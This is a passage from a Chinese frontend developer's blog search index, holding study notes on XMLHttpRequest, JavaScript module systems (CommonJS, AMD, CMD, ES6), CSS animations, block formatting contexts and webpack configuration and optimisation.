设置请求方法和url 发送 设置参数 get：请求数据拼在 url 中 post：设置请求头 格式内容 + 请求数据放在 send 里 ​ xhr.setRequestHeader(“Content-type”,“application/x-www-form-urlencoded”); 事件绑定 处理服务端返回结果 123456789101112131415const xml = new XMLHttpRequest();xhr.responseType = &#x27;json&#x27;; // open前 设置响应体数据xhr.timeout = 2000;xhr.ontimeout = function()&#123;...&#125;xhr.onerror = function()&#123;...&#125;xhr.open(&#x27;GET&#x27;,&#x27;http://....&#x27;);xhr.send();xhr.onreadystatechange = function()&#123; if(xhr.readyState == 4 &amp;&amp; xhr.status == 200)&#123; xhr.status; //状态码 xhr.statusText; //状态码字符串 xhr.getAllResponseHeaders(); //所有响应头 xhr.response; //响应体 &#125;&#125; xhr.abort() 4. readyState 表示请求发送的状态 0 1 2 3 4 0：未初始化 — 初始状态 1：启动 — open后 2：发送 — send后 3：接收 — 返回了部分数据 4：完成 — 返回了所有数据","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"模块化历程","slug":"further/01 模块化历程","date":"2021-11-09T16:00:00.000Z","updated":"2021-11-09T16:00:00.000Z","comments":false,"path":"furtherNotes/further/01 模块化历程","link":"furtherNotes/further/01 模块化历程","permalink":"https://shylees.github.io/furtherNotes/further/01%20%E6%A8%A1%E5%9D%97%E5%8C%96%E5%8E%86%E7%A8%8B","excerpt":"","text":"项目涉及到的模块化 参考的主要链接 前端模块化：CommonJS、AMD、CMD、ES6 1.模块化的理解 将一个复杂的程序依据一定的规则(规范)封装成几个块（文件），并进行组合在一起 块的内部数据与实现是私有的，只是想外部暴露一些接口（方法）与外部其他模块通信 2.模块化进化过程 2.1 全局 function 模式 编码：将不同的功能封装成不同的全局函数 问题：污染全局命名空间，容易引擎命名冲突或数据不安全，模块成员之间看不出关系 2.2 namespace 模式 编码：将不同功能封装在对象属性里 作用：解决了全局变量，解决命名冲突 问题：数据不安全，会暴露所有模块成员，内部成员状态可以被外部改写 12345678let myModule = &#123; name:&#x27;qsh&#x27;, foo() &#123; console.log(`foo $&#123; this.data &#125;`); &#125;&#125;myModule.data = &#x27;qrc&#x27;myModule.foo() // foo qrc 2.3 IIFE 模式：匿名函数子调用（闭包） 编码：将数据和行为封装到一个函数内部，通过给window添加属性来向外暴露成员 作用：数据私有，外部只能通过暴露的方法操作 问题：如果当前模块怎么依赖另一个模块 1234&lt;script src=&#x27;module.js&#x27;&gt;&lt;/script&gt;&lt;script&gt; myModule.foo() // foo qsh&lt;/script&gt; 12345678// module.js(function(window)&#123; let data = &#x27;qsh&#x27;; function()&#123; console.log(`foo $&#123; this.data &#125;`) &#125; window.myModule = &#123; foo &#125;&#125;) 2.4 IIFE 模式增强：引入依赖 现在模块化的基石 好处：保证了模块的独立性，使得模块之间的依赖关系变得明显 123456789// module.js(function(window,$)&#123; let data = &#x27;qsh&#x27;; function()&#123; console.log(`foo $&#123; this.data &#125;`); $(&#x27;body&#x27;).css(&#x27;background&#x27;,&#x27;red&#x27;); &#125; window.myModule = &#123; foo &#125;&#125;)(window,jQuery) 123456&lt;!-- 引入的js必须有一定顺序 --&gt;&lt;script src=&quot;jquery-1.10.1.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;module.js&quot;&gt;&lt;/script&gt;&lt;script&gt; myModule.foo() // foo qsh&lt;/script&gt; 3.模块化的好处 避免命名冲突，减少命名空间污染 更好分离，按需加载 更高复用性 高可维护性 4. 引入多个&lt;script&gt;后出现的问题 请求过多 要依赖多个模块，这就会发送多个请求，导致请求过多 依赖模糊 不知道具体的依赖关系，有可能因此导致加载先后顺序出错 难以维护 以上原因导致了难维护性。 模块化固然有多个好处，然而一个页面需要引入多个js文件，就会出现以上问题，这些问题可以通过模块化规范来解决。 5.模块化规范 5.1 CommonJS 5.1.1 概述 Node 应用由模块组成，采用CommonJS 模块规范，每个文件就是一个模块，有自己的作用域。 加载模块是同步的，只有加载完成，才能执行后面的操作。 在服务器端，模块的加载时运行时同步加载的； 在浏览器端，模块需要提前编译打包处理。 5.1.2 特点 所有代码都运行在模块作用域，不会污染全局作用域 模块可以多次加载，但只会在第一次加载时运行一次，然后运行结果会被缓存，再此加载的时候，就直接读取缓存结果。若要让模块再次加载，必须清除缓存。 模块的加载顺序，按照其在代码出现的顺序 5.1.3 基本语法 导出：module.exports = value 或 exports.xxx = value 导入：require(xxx) if 第三方模块 xxx 为模块名；if 自定义模块 xxx 为文件路径 5.1.4 问题 Q: CommonJS 暴露的模块是什么？ A: CommonJS 规范规定，每个模块内部，module 代表当前模块，module.exports 是对外的接口。加载某个模块，其实是加载该模块的 module.exports 属性。 Q: require 命令用来干什么？ A: 用于加载模块文件。其基本功能是，读入并执行一个 JavaScript 文件，然后返回该模块的 exports 对象。如果没有发现指定模块，会报错。 5.1.5 模块的加载机制 输入的是被输出的值的拷贝。模块内部的变化就影响不到这个输出的值。 其实是 按值传递(原始类型) 和 [按共享传递(引用类型)](./es 中函数的参数都是按值传递的.md) 这与ES6模块化有重大差异。 5.1.6 服务器端实现 下载 node.js 创建项目结构 npm init （package name 不能有中文名） 下载第三方模块 npm install uniq –save 定义模块代码 运行 js 代码 node xxx.js 5.1.7 浏览器端实现 创建项目结构 dist + src + index.html + package.json 下载 browserify 全局 -g 局部 –save-dev 定义模块代码 借助 browserify 打包 xxx.js 文件打包编译，（直接导入html 会报错） 导报处理js 根目录运行 browserify js/src/app.js -o js/dist/bundle.js index.html 引入 &lt;script type=&quot;text/javascript&quot; src=&quot;js/dist/bundle.js&quot;&gt;&lt;/script&gt; 5.2 AMD 5.2.1 概述 CommonJS 加载模块是同步的，只有加载完成，才能执行后面的操作。 AMD 则是非同步加载模块，允许指定回调函数。 5.2.2 特点 定义方法非常清晰 不会污染全局变量 清楚显示依赖关系 可用于浏览器环境，允许非同步加载模块，指定回调函数，可以根据动态加载模块 5.2.3 适用情况 因为 node.js 主要用于服务器编程，模块文件已经存在本地硬盘，所以加载比较块，不用考虑非同步加载的方式，所以 CommonJS 比较适用。 如果是浏览器环境，要从服务器端加载模块，就必须采用非同步，因此浏览器一般采用 AMD。 AMD 比 CommonJS 在浏览器端实现 早 5.2.4 基本语法 导出： 123456789// 定义没有依赖的模块define(function()&#123; return 模块&#125;)// 定义有依赖的模块define([&#x27;module1&#x27;,&#x27;module2&#x27;],function(m1,m2)&#123; return 模块&#125;) 导入： 123require([&#x27;module1&#x27;,&#x27;module2&#x27;],function(m1,m2)&#123; ...&#125;) 5.2.5 使用require.js RequireJS 是一个工具库，主要用于客户端的模块管理。其遵守 AMD 规范。其基本思想是，通过 define 方法，将代码定义为模块；通过 require 方法，实现代码的模块加载。 AMD 在浏览器实现的步骤： 下载引入 require.js 官网 github 将 require.js 导入项目： js/libs/require.js 创建项目结构 js &gt; libs + module + main.js &lt; + index.html 定义 require.js 的模块代码 12345678910111213141516171819202122232425262728293031// data.jsdefine(function()&#123; function getmsg()&#123; return &#x27;data&#x27; &#125; return &#123; getmsg &#125;;&#125;)//alterdata.jsdefine([&#x27;data&#x27;,&#x27;jquery&#x27;,function(data,$)&#123; function showmsg()&#123; alter(data.getmsg()); $(&#x27;body&#x27;).css(&#x27;background&#x27;, &#x27;green&#x27;) &#125; return &#123; showmsg &#125;;&#125;])//main.js(function()&#123; require.config(&#123; baseUrl:&#x27;js/&#x27;, path:&#123; // 映射 alterdata:&#x27;./modules/alterdata&#x27;, data:&#x27;./module/data&#x27;, jquery:&#x27;./libs/jquery-1.10.1&#x27; //jQuery 报错 &#125; &#125;) require([&#x27;alterdata&#x27;],function(alterdata)&#123; alterdata.showmsg() &#125;)&#125;)() 1&lt;script data-main=&quot;js/main&quot; src=&quot;js/libs/require.js&quot;&gt;&lt;/script&gt; 5.3 CMD 5.3.1 基本概念 CMD 专门用于浏览器端，模块异步加载，使用时才会加载执行。其整合了 CommonJS 和 AMD 的特点。在 Sea.js 种，所有 JavaScript 模块都遵循 CMD 规范。 5.3.2 基本语法 导出： 1234567891011121314151617// 定义没有依赖的模块define(function(require, exports, module)&#123; exports.xxx = val; module.exports = val;&#125;)// 定义有依赖的模块define(function(require, exports, module)&#123; // 同步引入依赖模块 const module2 = require(&#x27;./module2&#x27;) // 异步引入依赖模块 require.async(&#x27;./module3&#x27;,(m3) =&gt; &#123; &#125;) exports.xxx = val;&#125;) 导入： 1234define(function(require)&#123; let m1 = require(&#x27;./module1&#x27;); m1.show()&#125;) 5.3.3 sea.js 使用 下载sea.js 并引入 js/libs/sea.js 官网 github 创建项目结构 js &gt; libs + module &lt; + index.html 定义sea.js 模块代码 引入index.html 1234&lt;script type=&quot;text/javascript&quot; src=&quot;js/libs/sea.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; seajs.use(&#x27;./js/modules/main&#x27;)&lt;/script&gt; 5.4 ES6 5.4.1 基本概念 ES6 模块的设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系，以及输入和输出的变量。CommonJS 和 AMD 都只能在运行时确定这些东西。比如，CommonJS 模块就是对象，输入时必须查找对象属性。 5.4.2 ES6 模块化语法 导出：export { xxx } / export default xxx 导入：import { xxx } from … / import xxx from … 5.4.3 ES6 模块与 CommonJS 模块的差异 CommonJS 输出的是值的拷贝；ES6 Module 输出的是值的引用 ES6 Module 的运行机制与 CommonJS 不一样。ES6 Module 是动态引用，并且不会缓存值，模块里面的变量绑定其所在的模块。 CommonJS 是运行时加载；ES6 Module 时编译时输出接口 因为 CommonJS 加载的是一个对象，即 module.exports 属性，该对象只有在脚本运行完才会生成。 而 ES6 Module 不是对象，它的对外接口只是一种静态定义，在代码静态解析阶段就会生成 5.4.4 ES6-Babel-Browserify 使用 使用 Babel 将 ES6 编译为 ES5 代码，使用 Browserify 编译打包js 定义package.json 文件 安装babel-cil，babel-preset-es2015 和 browserify 定义 .babelrc 文件 定义模块代码 导入index.html 6. 总结 CommonJS规范主要用于服务端编程，加载模块是同步的，有缓存，这并不适合在浏览器环境，因为同步意味着阻塞加载，浏览器资源是异步加载的，因此有了AMD CMD解决方案。 AMD规范在浏览器环境中异步加载模块，而且可以并行加载多个模块。不过，AMD规范开发成本高，代码的阅读和书写比较困难，模块定义方式的语义不顺畅。 CMD规范与AMD规范很相似，都用于浏览器编程，依赖就近，延迟执行，可以很容易在Node.js中运行。不过，依赖 SPM 打包，模块的加载逻辑偏重。 ES6 在语言标准的层面上，实现了模块功能，而且实现得相当简单，完全可以取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案。","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"},{"name":"es6","slug":"es6","permalink":"https://shylees.github.io/tags/es6/"}]},{"title":"CSS3 animate","slug":"further/animate 动画","date":"2021-10-25T16:00:00.000Z","updated":"2021-10-25T16:00:00.000Z","comments":false,"path":"learningNotes/further/animate 动画","link":"learningNotes/further/animate 动画","permalink":"https://shylees.github.io/learningNotes/further/animate%20%E5%8A%A8%E7%94%BB","excerpt":"","text":"CSS3 animate CSS animations 使得可以将从一个CSS样式配置转换到另一个CSS样式配置。动画包括两个部分:描述动画的样式规则和用于指定动画开始、结束以及中间点样式的关键帧。 制作动画 定义动画 1234@keyframs myanimate&#123; 0%&#123;&#125; 100%&#123;&#125;&#125; 使用动画 123456div&#123; ... animation:name duration timing-function delay iteration-count direction fill-mode; /*动画名 持续时间 运动曲线 何时开始 播放次数 是否反方向 动画起始或者结束的状态*/ /* 简写不包括 play-state 运行还是暂停 */&#125; 常见属性 属性 描述 @keyframes 规定动画 animation 所有动画的简写属性，除了animation-play-state属性 animation-name 规定@keyframes动画的名称（必须） animation-duration 规定动画完成一个周期所花费的秒或毫秒，默认为0（必须） animation-timing-function 规定动画是的速度曲线，默认为ease animation-delay 规定动画合适开始，默认是0 animation-iteration-count 规定动画播放的次数，默认1，还有ifinite（无限） animation——direction 规定动画是否在下一周逆向播放，默认为normal，逆播放alternate animation-play-state 规定动画是否正在运行或停止，默认running 还有paused animation-fill-mode 规定动画结束后状态，保持forwards回到起始backwards 总结： 简写属性不包括animation-play-state 暂停动画：animation-play-state：puased；经常和鼠标经过等其他配合使用 想要动画走回来，而不是直接跳回来：animation-direction：alternate； 盒子动画结束后，停在结束位置：animation-fill-mode：forwards；","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"css","slug":"css","permalink":"https://shylees.github.io/tags/css/"}]},{"title":"BFC 和 触发BFC","slug":"further/BFC 和 触发BFC","date":"2021-10-25T16:00:00.000Z","updated":"2021-10-25T16:00:00.000Z","comments":false,"path":"furtherNotes/further/BFC 和 触发BFC","link":"furtherNotes/further/BFC 和 触发BFC","permalink":"https://shylees.github.io/furtherNotes/further/BFC%20%E5%92%8C%20%E8%A7%A6%E5%8F%91BFC","excerpt":"","text":"1.常见定位方案 普通流 (normal flow) 在普通流中，元素按照其在 HTML 中的先后位置至上而下布局，在这个过程中，行内元素水平排列，直到当行被占满然后换行，块级元素则会被渲染为完整的一个新行，除非另外指定，否则所有元素默认都是普通流定位，也可以说，普通流中元素的位置由该元素在 HTML 文档中的位置决定。 浮动 (float) 在浮动布局中，元素首先按照普通流的位置出现，然后根据浮动的方向尽可能的向左边或右边偏移，其效果与印刷排版中的文本环绕相似。 绝对定位 (absolute positioning) 在绝对定位布局中，元素会整体脱离普通流，因此绝对定位元素不会对其兄弟元素造成影响，而元素具体的位置由绝对定位的坐标决定。 2.BFC是什么 块格式化上下文（Block Formatting Context，BFC） 是Web页面的可视CSS渲染的一部分，是块盒子的布局过程发生的区域，也是浮动元素与其他元素交互的区域。属于上述定位方案的普通流。 具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。 通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。 3.触发/创建 BFC 简洁版： body根元素 浮动元素：float 除 none 以外的值 绝对定位元素：position (absolute、fixed) display ( inline-block、table-cells、flex ) overflow 除 visible 以外的值 ( hidden、auto、scroll ) 详细版： 根元素（&lt;html&gt;） 浮动元素（元素的 float 不是 none） 绝对定位元素（元素的 position 为 absolute 或 fixed） 行内块元素（元素的 display为 inline-block） 表格单元格（元素的 display为 table-cell，HTML表格单元格默认为该值） 表格标题（元素的 display为 table-caption，HTML表格标题默认为该值） 匿名表格单元格元素（元素的 display为 table、table-row、 table-row-group、table-header-group、table-footer-group（分别是HTML table、row、tbody、thead、tfoot 的默认属性）或 inline-table） overflow 计算值(Computed)不为 visible 的块元素 display值为 flow-root 的元素 contain 值为 layout、content 或 paint 的元素 弹性元素（display 为 flex 或 inline-flex 元素的直接子元素） 网格元素（display为 grid 或 inline-grid 元素的直接子元素） 多列容器（元素的 column-count 或 column-width (en-US)不为 auto，包括 ``column-count 为 1） column-span 为 all 的元素始终会创建一个新的BFC，即使该元素没有包裹在一个多列容器中（标准变更，Chrome bug）。 块格式化上下文包含创建它的元素内部的所有内容. 4.BFC 特性及其应用 同一个 BFC 下外边距会发生折叠 解决外边距塌陷：将其放在不同的 BFC 容器中 BFC 可以包含浮动的元素 清除浮动：父元素触发 BFC BFC 可以阻止元素被浮动元素覆盖","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"css","slug":"css","permalink":"https://shylees.github.io/tags/css/"}]},{"title":"webpack 学习笔记","slug":"webpack","date":"2021-09-12T16:00:00.000Z","updated":"2021-09-14T16:00:00.000Z","comments":false,"path":"learningNotes/webpack","link":"learningNotes/webpack","permalink":"https://shylees.github.io/learningNotes/webpack","excerpt":"","text":"0. atguigu 视频 的第三方包的版本 0.1 创建项目 初始化项目 npm init 0.2 包版本 全局安装 -g 和 本地安装 -D : webpack@4.41.6 我下的—5.52.1 webpack-cli@3.3.11 —4.8.0 loader 和一些 pulgin 插件： 1. 处理css： css-loader@3.4.2 —6.2.0 style-loader@1.1.3 —3.2.1 2. 处理less less-loader@5.0.0 —10.0.1 less@3.11.1 —4.1.1 3. 处理html html-webpack-plugin@3.2.0 —5.3.2 4. 处理img url-loader@3.0.0 —4.1.1 file-loader@5.0.2 —6.2.0 5. 处理html img html-loader@0.5.5 —2.1.2 6. devServer webpack-dev-server@3.10.3 —4.2.0 7. 分离css mini-css-extract-plugin@0.9.0 8. css兼容 postcss-roader@3.0.0 postcss-preset-env@6.7.0 9. css压缩 optimize-css-assets-webpack-plugin@5.0.3 10. js兼容 babel-roader@8.0.6 @babel-preset-env@7.4.8 @babel/core@7.8.4 @babel-polyfill@7.8.3 core-js@3.6.4 11. pwa workbox-webpack-plugin@5.0.0 serve@11.3.0 12. 多进程 thread-roader@2.1.3 13. dll add-asset-html-webpack-plugin@3.1.3 terser-webpack-plugin@2.3.5 1.webpack 开发环境配置 1.1 基本配置 1234567891011121314151617181920212223const &#123; resolve &#125; = require(&#x27;path&#x27;);module.exports = &#123; // 入口起点 entry: &#x27;./src/js/index.js&#x27;, // 输出 output: &#123; filename: &#x27;bulit.js&#x27;, path: resolve(__dirname, &#x27;build&#x27;) &#125;, // loader配置 module: &#123; rules: [ // 详细loader配置 ] &#125;, // plugins插件的配置 plugins: [ ], mode: &#x27;development&#x27;, // mode: &#x27;production&#x27;,&#125; 1.2 loader的配置 1.2.1 css 12345678910111213// 配置css &#123; // 匹配了哪些文件 test: /\\.css$/, // 使用了哪些loader进行处理 use: [ // use数组中 loader的执行顺序:从右到左 从下到上 // 创建 style 标签，将js中的样式资源插入到head中 &#x27;style-loader&#x27;, // 将css文件变化 commonjs 模块加载到js中 里面的内容样式是字符串 &#x27;css-loader&#x27; ] &#125;, 1.2.2 less 1234567//配置less 要加上上面配置的css &#123; test: /.\\less$/, // 最后一个 将less 编译成css 文件 // 需要下载 less-loader less use: [&#x27;style-loader&#x27;, &#x27;css-loader&#x27;, &#x27;less-loader&#x27;] &#125;, 1.2.3 图片 1234567891011121314151617181920212223242526272829303132//配置图片资源 默认处理不了 html 中的img &#123; test: /\\.(jpg|png|gif|jpeg)$/, // 使用一个loader时 可以直接用下面这种方法 // 下载 url-loader file-loader-&gt; 不用下载 loader: &#x27;url-loader&#x27;, options: &#123; publicPath: &#x27;./img&#x27;, outputPath: &#x27;img&#x27;, // 图片大小小于 8kb 就会被base64 处理 // 优点：减少请求数量 减轻服务器压力 // 缺点：图片体积会更大 文件请求速度更慢 limit: 8 * 1024, // fallback: resolve(&#x27;file-roader&#x27;), // 对图片进行重命名 name: &#x27;img/[name][hash:10].[ext]&#x27;, // 因为url-loader 默认 es6 模块化解析 而html-loader引入图片是commonjs // 解析时 会出现 [object Module] // 关闭 url-loader 的es6 模块化 使用 commonjs esModule: false, &#125;, //或者 // use: &#123; // loader: &#x27;url-loader&#x27;, // options: &#123; // publicPath: &#x27;./img&#x27;, // outputPath: &#x27;img/&#x27;, // limit: 8192, // esModule: false // &#125; // &#125;, type: &#x27;javascript/auto&#x27;, //必要 1.2.4 html中的图片 123456789//在上面图片配置的基础上 //处理 html 的img &#123; test: /\\.html$/, // 引入 img 从而被 url-loader处理 loader: &#x27;html-loader&#x27;, options: &#123; esModule: false, &#125; 1.2.5 html 1234567891011//plugins : 下载 -&gt; 导入 -&gt; 使用const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;);// plugins插件的配置 plugins: [ // html-webpack-plugin // if 直接 new...() 会创建一个空的html 自动引入打包输出的所有资源 // if new...(&#123; template:&#x27;url&#x27;&#125;) 会有路径中的文件的结果 new HtmlWebpackPlugin(&#123; template: &#x27;./src/index.html&#x27; &#125;) ], 1.2.6 热部署 1234567891011121314// 最新 webpack-cil 于这个不匹配// 开发服务器 devServer 用来自动化 自动编译 打开浏览器 刷新// 特点 只会在内存中编译打包 不会有任何输出// 启动 npx webpack-dev-server devServer: &#123; // 项目构建后目录 contentBase: resolve(__dirname, &#x27;build&#x27;), // 启动gzip压缩 compress: true, // 端口号 port: 3000, // 自动打开浏览器 open: true&#125; 2.webpack 开发环境依赖 2.1 提取css 成单独文件 1234567891011121314151617181920212223242526272829303132const &#123; resolve &#125; = require(&#x27;path&#x27;); const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;); const MiniCssExtractPlugin = require(&#x27;mini-css-extract-plugin&#x27;); module.exports = &#123; entry: &#x27;./src/js/index.js&#x27;, output: &#123; filename: &#x27;js/built.js&#x27;, path: resolve(__dirname, &#x27;build&#x27;) &#125;, module: &#123; rules: [ &#123; test: /\\.css$/, use: [ // 创建 style 标签，将样式放入 // &#x27;style-loader&#x27;, // 这个 loader 取代 style-loader。作用：提取js中的css成单独文件 MiniCssExtractPlugin.loader, // 将 css 文件整合到 js 文件中 &#x27;css-loader&#x27; ] &#125; ] &#125;, plugins: [ new HtmlWebpackPlugin(&#123; template: &#x27;./src/index.html&#x27; &#125;), new MiniCssExtractPlugin(&#123; // 对输出的 css 文件进行重命名 filename: &#x27;css/built.css&#x27; &#125;) ], mode: &#x27;development&#x27; &#125;; 2.2 css兼容 12345678910111213141516171819202122232425//webpack.config.js&#123; test: /\\.css$/, use: [ MiniCssExtractPlugin.loader, &#x27;css-loader&#x27;, &#123; loader: &#x27;postcss-loader&#x27;, options: &#123; ident: &#x27;postcss&#x27;, plugins: () =&gt; [ // postcss 的插件 require(&#x27;postcss-preset-env&#x27;)() ] &#125; &#125; ]&#125;plugins: [ new HtmlWebpackPlugin(&#123; template: &#x27;./src/index.html&#x27; &#125;), new MiniCssExtractPlugin(&#123; filename: &#x27;css/built.css&#x27; &#125;) ] 12345678910111213//package.js&quot;browserslist&quot;: &#123; &quot;development&quot;: [ &quot;last 1 chrome version&quot;, &quot;last 1 firefox version&quot;, &quot;last 1 safari version&quot; ], &quot;production&quot;: [ &quot;&gt;0.2%&quot;, &quot;not dead&quot;, &quot;not op_mini all&quot; ] &#125; 2.3 css压缩 1234plugins: [ ... //同上 new OptimizeCssAssetsWebpackPlugin() ], 2.4 js语法检查 eslint 1234567891011121314151617rules: [ /*语法检查： eslint-loader eslint 注意：只检查自己写的源代码，第三方的库是不用检查的 设置检查规则： package.json 中 eslintConfig 中设置~ &quot;eslintConfig&quot;: &#123; &quot;extends&quot;: &quot;airbnb-base&quot; &#125; airbnb --&gt; eslint-config-airbnb-base eslint-plugin-import eslint */ &#123; test: /\\.js$/, exclude: /node_modules/, loader: &#x27;eslint-loader&#x27;, options: &#123; // 自动修复 eslint 的错误 fix: true &#125; &#125; ] 1234567//package.json&quot;eslintConfig&quot;: &#123; &quot;extends&quot;: &quot;airbnb-base&quot;, &quot;env&quot;: &#123; &quot;browser&quot;: true &#125; &#125; 2.5 js兼容 12345678910111213141516171819202122rules: [ &#123; test: /\\.js$/, exclude: /node_modules/, loader: &#x27;babel-loader&#x27;, options: &#123; // 预设：指示 babel 做怎么样的兼容性处理 presets: [ [ &#x27;@babel/preset-env&#x27;, &#123; // 按需加载 useBuiltIns: &#x27;usage&#x27;, // 指定 core-js 版本 corejs: &#123; version: 3 &#125;, // 指定兼容性做到哪个版本浏览器 targets: &#123; chrome: &#x27;60&#x27;, firefox: &#x27;60&#x27;, ie: &#x27;9&#x27;, safari: &#x27;10&#x27;, edge: &#x27;17&#x27; &#125; &#125; ] ] &#125; &#125; ] 2.6 js压缩 12// 生产环境下会自动压缩 js 代码 mode: &#x27;production&#x27; 2.7 html压缩 webpack5也能压缩html 12345678910111213plugins: [ new HtmlWebpackPlugin(&#123; template: &#x27;./src/index.html&#x27;, // 压缩 html 代码 minify: &#123; // 移除空格 collapseWhitespace: true, // 移除注释 removeComments: true &#125; &#125;) ],mode: &#x27;production&#x27; 3. webpack优化配置 3.1 HMR 12345678910mode: &#x27;development&#x27;, devServer: &#123; contentBase: resolve(__dirname, &#x27;build&#x27;), compress: true, port: 3000, open: true, // 开启 HMR 功能 // 当修改了 webpack 配置，新配置要想生效，必须重新 webpack 服务 hot: true &#125; 3.2 source-map 1devtool: &#x27;eval-source-map&#x27; 3.3 OneOf 1234// 以下 loader 只会匹配一个 // 注意：不能有两个配置处理同一种类型文件 oneOf: [ ..处理css less img js...] 3.4 缓存 12345678910111213141516171819202122232425262728/*正常来讲，一个文件只能被一个 loader 处理。 当一个文件要被多个 loader 处理，那么一定要指定 loader 执行的先后顺序： 先执行 eslint 在执行 babel */&#123; test: /\\.js$/, exclude: /node_modules/, loader: &#x27;babel-loader&#x27;, options: &#123; // 预设：指示 babel 做怎么样的兼容性处理 presets: [ [ &#x27;@babel/preset-env&#x27;, &#123; // 按需加载 useBuiltIns: &#x27;usage&#x27;, // 指定 core-js 版本 corejs: &#123; version: 3 &#125;, // 指定兼容性做到哪个版本浏览器 targets: &#123; chrome: &#x27;60&#x27;, firefox: &#x27;60&#x27; &#125; &#125; ] ], // 开启 babel 缓存 // 第二次构建时，会读取之前的缓存 cacheDirectory: true &#125; &#125; 3.5 tree shaking 树摇 前提：必须使用 es6 模块化 开启 production 环境 作用：减少代码体积 123456//package.json//所有代码都没有副作用 都可以进行树摇//问题：可能会把 css/ @babel/polyfill 文件干掉&quot;sideEffects&quot;:false,//对数组里的文件会忽略该操作&quot;sideEffects&quot;:[&quot;*.css&quot;,&quot;*.less&quot;] 3.6 code spilt 代码分割 利用多入口 打包成多个js文件 1234entry:&#123; index: ’./src/js/index.js’, test: ’./src/js/test.js’&#125; 单/多入口 与 optimization 配合 12345678910entry: ‘./src/index.js’,// 或者 多入口//1. 可以将node_modules中代码单独打包一个chunk最终输出//2. 自动分析多入口chunk中，有无公共文件 if有 就会打包成单独一个chunkoptimization:&#123; splitChunks:&#123; chunk: ’all’ &#125;&#125; 在单入口 与 optimization 配合 页面的 js 文件里面使用 import 通过js代码，让某某个文件被单独打包成一个chunk import 动态导入语法：能将某个文件单独打包 123456// /* webpackChunkName: &#x27;test&#x27; */ webpack.config.js 中 的[name] == testimport(/* webpackChunkName: &#x27;test&#x27; */&#x27;./test&#x27;).then((&#123;mul,count&#125;) =&gt; &#123; //文件加载成功&#125;).catch(() =&gt; &#123; //文件加载失败&#125;) 3.7 lazy loading 懒加载：文件需要使用是才加载 预加载 prefetch：使用之前 提前记载js文件 等其他资源加载完毕 浏览器空闲了 再偷偷加载 eg 12345678910btn.onclick = function()&#123; //懒加载 import(/* webpackChunkName: &#x27;test&#x27; */&#x27;./test&#x27;).then((&#123;mul,count&#125;) =&gt; &#123; //文件加载成功 &#125;) //预加载 import(/* webpackChunkName: &#x27;test&#x27; , webpackPrefetch: true */&#x27;./test&#x27;).then((&#123;mul,count&#125;) =&gt; &#123; //文件加载成功 &#125;)&#125; 3.8 pwa 现在好像已经被淘汰了 pwa 渐进式网络开发应用程序 离线可访问 123456789// webpack.config.jsnew WorkboxWebpackPlugin.GenerateSW&#123; //1.帮助serviceworker快速启动 //2.删除旧的 serviceworker //生成一个serviceworker 配置文件 clicentsClaim: true, skipWaiting: true&#125; 123456789101112131415// index.js//注册 serviceWorker//处理兼容性问题if(&#x27;serviceWorke&#x27; in navigator)&#123; window.onload(() =&gt; &#123; navigator.serviceWorker .register(&#x27;/service-worker.js&#x27;) .then(() =&gt; &#123; log(&#x27;成功&#x27;) &#125;) .catch(() =&gt; &#123; log(&#x27;失败&#x27;) &#125;) &#125;)&#125; 12345//因为eslint不认识 window navigator全局变量//解决 需要修改 package.json eslintConfig 配置&quot;env&quot;:&#123; &quot;browser&quot;:true //支持浏览器端全局变量&#125; sw 必须运行在服务器上 nodejs npm i serve -g serve -s build 启动服务器 将build目录的所有资源 作为静态资源暴露出去 3.9 多进程打包 12345678910111213&#123; test: /\\.js$/, exclude: /node_modules/, use: [&#123; /*开启多进程打包。 进程启动大概为 600ms，进程通信也有开销。 只有工作消耗时间比较长，才需要多进程打包 */ loader: &#x27;thread-loader&#x27;, options: &#123; workers: 2 // 进程 2 个 &#125; &#125;]&#125; 3.10 externals 不打包 jquery 然后 在html 手动引入cdn 12345mode: &#x27;production&#x27;, externals: &#123; // 拒绝 jQuery 被打包进来 jquery: &#x27;jQuery&#x27; &#125; 3.11 dll 使用dll 对某些 第三方库 进行单独打包 运行webpack 时 默认查找webpack.config.js 所以运行 改文件应 webpack --config webpack.dll.js 1234567891011121314151617181920212223// webpack.dll.js...const webpack = require(&quot;webpack&quot;);entry:&#123; //最终打包生成的[name] = jquery //[&#x27;jquery&#x27;] = 要打包的库 jquery:[&#x27;jquery&#x27;]&#125;，output:&#123; filename:&#x27;[name].js&#x27;, path:resolve(__dirname,&#x27;dll&#x27;), //打包后的位置 library:&#x27;[name]_[hash]&#x27; //打包的库里面向外暴露出去的内容的名字&#125;,plugins:[ // 告诉webpack 不用再打包了 //打包生成一个manifest.js 提供和jq 的映射 new webpack.DllPlugin(&#123; name:&#x27;[name]_[hash]&#x27;, //映射库的暴露内容名称 path:resolve(__dirname,&#x27;dll/nanifest.json&#x27;) //输出文件路径 &#125;)] 之后再运行webpack 就不会再重复打包jq了 123456789101112//webpack.config.jsplugins: [ new HtmlWebpackPlugin(&#123; template: &#x27;./src/index.html&#x27; &#125;), // 告诉 webpack 哪些库不参与打包，同时使用时的名称也得变~ new webpack.DllReferencePlugin(&#123; manifest: resolve(__dirname, &#x27;dll/manifest.json&#x27;) &#125;), // 将某个文件打包输出去，并在 html 中自动引入该资源 new AddAssetHtmlWebpackPlugin(&#123; filepath: resolve(__dirname, &#x27;dll/jquery.js&#x27;) &#125;)] 3.12 优化总结 开发环境性能优化 优化打包构建速度 HMR 